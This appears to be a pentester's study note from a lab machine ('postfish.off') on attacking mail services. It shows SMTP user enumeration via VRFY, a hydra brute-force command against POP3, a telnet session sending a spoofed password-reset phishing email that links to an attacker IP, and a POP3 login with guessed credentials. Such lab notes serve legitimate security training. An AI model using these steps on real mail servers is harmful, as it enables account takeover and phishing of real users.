---
publish: true
created: 2026-03-14T11:16:09.608+05:30
modified: 2026-06-22T09:02:14.952+05:30
---

SMTP is only for sending email. You cannot check mails here. You will need POP3 (110) or imap (143) to read mails.

# SMTP

<https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-smtp/smtp-commands>

To check domain name.

```
$ echo "EHLO test" | nc domain.com 25
```

username enumeration:
if you find a bunch of users on the website, save them and then enumerate.

```
$ hydra smtp-enum://postfish.off:25/vrfy -L "/home/kali/offsec/postfish/exploit/users" 2>&1

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 15:17:59
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking smtp-enum://postfish.off:25/vrfy
[25][smtp-enum] host: postfish.off   login: Claire.Madison
[25][smtp-enum] host: postfish.off   login: Mike.Ross
[25][smtp-enum] host: postfish.off   login: Brian.Moore
[25][smtp-enum] host: postfish.off   login: Sarah.Lorem
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-14 15:17:59
```

## smtp-user-enum

same as above. user enumeration using other tool.

```
$ smtp-user-enum -M VRFY -U exploit/users -t 192.168.168.137
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... exploit/users
Target count ............. 1
Username count ........... 5
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sat Mar 14 15:30:08 2026 #########
192.168.168.137: Mike.Ross exists
192.168.168.137: Claire.Madison exists
192.168.168.137: Brian.Moore exists
192.168.168.137: Sarah.Lorem exists
######## Scan completed at Sat Mar 14 15:30:09 2026 #########
4 results.

5 queries in 1 seconds (5.0 queries / sec)
```

## Password bruteforce

after users have been enumerated from above methods. generate wordlist with `cewl` tools.

```
$ hydra -V -L /home/kali/offsec/postfish/exploit/users -P /home/kali/offsec/postfish/exploit/custom-wordlist1.txt pop3://postfish.off -t 
```

### send mail

using telnet, connect first.

```
$ telnet postfish.off 25
Trying 192.168.168.137...
Connected to postfish.off.
Escape character is '^]'.
220 postfish.off ESMTP Postfix (Ubuntu)
EHLO postfish.off
250-postfish.off
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
HELO postfish.off
250 postfish.off
```

put the details. the end of message is `<CR><LF>.<CR><LF>`

```
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Password Reset
reset password at this link http://192.168.45.180/
.
250 2.0.0 Ok: queued as 42D344474C
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

# POP3

## Login , check mail

To login and check mail.

Connect via telnet.

```
$ telnet postfish.off 110
Trying 192.168.168.137...
Connected to postfish.off.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.

```

use the account to login eg: `sales:sales`

```
user sales
+OK
pass sales
+OK Logged in.
```

Use `list` to check number of mails and `RETR` to display mail id with `1`.

```
list
+OK 1 messages:
1 683
.
RETR 1
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
	id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
	by postfish.off (Postfix) with SMTP id 7712145434
	for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.
-ERR Disconnected for inactivity.
Connection closed by foreign host.
```
